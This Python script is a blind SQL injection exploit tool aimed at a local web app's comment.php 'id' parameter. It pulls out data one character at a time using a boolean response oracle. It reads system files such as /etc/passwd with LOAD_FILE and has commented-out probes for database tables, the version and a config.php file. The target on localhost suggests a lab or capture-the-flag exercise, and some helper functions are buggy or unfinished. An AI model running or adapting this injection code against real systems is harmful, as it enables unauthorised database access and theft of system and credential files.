#! /usr/bin/python3

import requests
import sys

from tools import *
from payloads import *
from body_conditions import *
from tester import Tester
from string_finder import StringFinder


def test(payload):
	r = requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload)}, verify=False)
	print('[*] {} => {}'.format(payload, 'admin' not in r.text))	
	#print(r.request.url)
	return 'admin' not in r.text

class MyTester(Tester):

    def __init__(self):
        super(MyTester, self).__init__(lambda r : 'admin' in r.text)
    
    def get_request(self, payload):
        return requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload)}, verify=False)

sf = StringFinder(MyTester())

print(sf.read_string("(SELECT {})".format(encode_str('coucou'))))

def read_file(filename):
	return read_string("LOAD_FILE({})".format(encode_str('/etc/passwd')))

def read_file__(file):
	index = 1
	str = ''
	while True:
		for c in range(20,127):
			if(test(file_char_at_index(file,c, index))):
				str += chr(c)
				print(str)
				break
		print(str)
		break			
		index = index + 1


# print(read_string("(SELECT table_name FROM information_schema.tables ORDER BY table_name LIMIT 1 OFFSET 6)"))

# print(read_string("(SELECT version())"))

#print(test( "AND hex(SUBSTRING(LOAD_FILE({}),{},1))={}".format(
#		encode_str('/etc/passwd'), 1, 72)))

# print(test("UNION ALL SELECT 1 as cmd"))

#read_file('/etc/passwd')

#print(test(file_exists('/etc/passwd')))

#print(test(fl_equal('/etc/passwd', 1386)))

#print(test(file_exists('/usr/share/nginx/www/config.php')))



